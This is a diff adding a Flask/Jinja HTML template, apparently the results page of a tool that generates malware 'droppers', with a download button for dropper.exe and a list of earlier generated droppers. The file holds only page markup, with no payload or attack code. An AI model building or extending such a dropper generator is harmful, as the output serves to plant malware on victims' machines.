@@ -1,0 +1,43 @@
+{% extends "base.html" %}
+
+{% block content %}
+    <div class="columns is-centered">
+        <div class="column is-half">
+            <!-- Success or Error Message -->
+            <div class="notification is-info" id="message">
+                <h1 class="title has-text-centered">{{ message }}</h1>
+
+                {% if error_message %}
+                    <div class="notification is-danger mt-3">
+                        <h3 class="subtitle">Error Details:</h3>
+                        <p>{{ error_message }}</p>
+                    </div>
+                {% endif %}
+            </div>
+
+            <!-- Download New Dropper -->
+            <div class="box mt-5">
+                <h2 class="subtitle has-text-centered">Download Your Generated Dropper:</h2>
+                <div class="has-text-centered">
+                    <a href="{{ url_for('static', filename='outputs/dropper.exe') }}" class="button is-success is-medium">
+                        Download Dropper.exe
+                    </a>
+                </div>
+            </div>
+
+            <!-- Previous Droppers Section -->
+            <div class="box mt-5">
+                <h2 class="subtitle has-text-centered">Previous Generated Droppers:</h2>
+                <ul>
+                    {% for dropper in previous_droppers %}
+                        <li>
+                            <a href="{{ url_for('static', filename='outputs/' + dropper) }}" class="button is-link is-outlined">
+                                {{ dropper }}
+                            </a>
+                        </li>
+                    {% endfor %}
+                </ul>
+            </div>
+        </div>
+    </div>
+{% endblock %}
